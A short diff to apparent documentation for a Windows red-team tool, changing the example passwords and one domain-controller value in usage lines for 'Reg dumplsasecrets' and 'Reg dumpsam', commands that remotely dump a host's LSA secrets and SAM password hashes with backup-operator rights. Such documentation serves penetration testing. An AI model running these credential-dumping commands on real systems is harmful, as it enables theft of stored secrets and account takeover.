@@ -169,7 +169,7 @@ Reg dumplsasecrets [options] <ServerName>
 ### Example 1 - Dump the LSA secrets using a backup operator
 
 ```
-Reg dumplsasecrets -UserName marks@LUMON -Kdc 10.66.0.11 -Password She'sAlive!! LUMON-FS1 -BackupSemantics
+Reg dumplsasecrets -UserName marks@LUMON -Kdc 10.66.0.11 -Password She's@live!! LUMON-FS1 -BackupSemantics
 ```
 # Reg dumpsam
   Dumps the SAM of a remote system
@@ -315,7 +315,7 @@ Reg dumpsam [options] <ServerName>
 ### Example 1 - Dump the SAM using a backup operator
 
 ```
-Reg dumpsam -UserName marks@LUMON -Kdc 10.66.0.11 -Password She'sAlive!! LUMON-FS1 -BackupSemantics
+Reg dumpsam -UserName marks@LUMON -Kdc LUMON-DC1 -Password She's@live!! LUMON-FS1 -BackupSemantics
 ```
 # Reg getdcomapp
   Gets information about a DCOM application
